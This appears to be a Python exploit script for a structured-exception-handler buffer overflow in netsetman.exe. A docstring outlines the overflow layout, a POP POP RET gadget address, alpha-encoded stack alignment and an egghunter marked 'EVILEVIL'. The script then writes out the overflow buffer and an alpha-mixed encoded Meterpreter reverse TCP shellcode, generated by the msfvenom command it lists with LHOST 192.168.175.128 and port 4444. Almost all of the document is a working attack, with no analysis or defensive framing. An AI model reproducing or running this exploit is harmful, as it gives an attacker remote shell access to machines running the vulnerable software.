"""
1. Overflow : JUNK * 74 + NOP + EIP + Stack Align + EGG + SHELLCODE
2. POP POP RET : #0x00750051 : pop ebx # pop ebp # ret 0x08 | startnull,unicode,asciiprint,ascii {PAGE_EXECUTE_READ} [netsetman.exe]
3. Stack Alignment Code 
	0576FD2C       55               PUSH EBP
	0576FD2D       0045 00          ADD BYTE PTR SS:[EBP],AL
	0576FD30       58               POP EAX
	0576FD31       0045 00          ADD BYTE PTR SS:[EBP],AL
	0576FD34       05 00070011      ADD EAX,11000700
	0576FD39       0045 00          ADD BYTE PTR SS:[EBP],AL
	0576FD3C       2D 00010011      SUB EAX,11000100
	0576FD41       0045 00          ADD BYTE PTR SS:[EBP],A

4. Egg : Alpha Encoded Egg with EVILEVIL
5. Shellcode :  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.175.128 LPORT=4444 EXITFUNC=seh BufferRegister=EDI -e x86/alpha_mixed 
"""

buf = "\x43" * 74
nop = "\x44\x45"
ret = "\x51\x75"

reg_align = "\x55\x45\x58\x45\x05\x07\x11\x45\x2D\x01\x11\x45"

padding = '\x72' * 94

egg = "PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRFSQWZKOLO0BB2QZKRPX8MNNOLM5QJRTZOGHQ5PVPIPLTKKJVO2UZJ6ORU9WKOK7A"

cod = buf + nop + ret + reg_align + padding + egg

f = open('netsetman.txt', 'w')
f.write(cod)
f.close()


shell = "WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIylhhK2UPC0c0cPMYiuDq9Pe4lKBptpLKpRTLLK62B4NkSBa8Voh7RjevVQIollEle11lC2VLq0ZahO4Mc1Zg8bhrV2CgNk3btPlKRjgLlK2ltQahysrhuQkacaLK3igPWq9CLKQYEHJCwJ79LK04lKuQ9FVQIoNLZaxOTMuQYWgH9pPuIfGs1ml85kQm7TQeXdv8nk68vD31yCRFLKDLPKlKShuLGqn3nkFdNk7qn0OyctetfD1KskaqciQJF19oYpaOqOBzlKvrHkLMqMcXGCfRwpWpe82WQcub3obtE82lbWQ6fgK9yxioxPH8Z0s1s0gpdiYTRt2pRHfIK0BKuPIoIECZ5Z3X9PoXloMP2H5RuPtQaLNiXff0v0v0BpSpv0sp2pu8JJ6oiOKPioIEMGqzvpCfaG3Xj9mu2TSQIokeLEkpad5ZIornWxBUhlHh2GUPEPwp1zgp3ZETbv1GrHuRIIxHQO9o9EMSyhuPcN4vLKuf3Z7058EP20uP30F6sZUPrHQHoTPS9uKOzunsccRJuPsff3SgPhdBiIzhqOKOIEK3JXUP3Muxv82HS03puPuPazWp2pRHTKVO4OVP9oke67cXRUrN0M3QkOIEqNaNio6l7T6olEBP9okOIoximK9oIoYoGqo3Ti8FaejaXCMk9nFnwBKZsZEPF3IojucZc0HCAA"


shellcode = "EVILEVIL" + shell

f = open('shellcode.txt', 'w')
f.write(shellcode)
f.close()
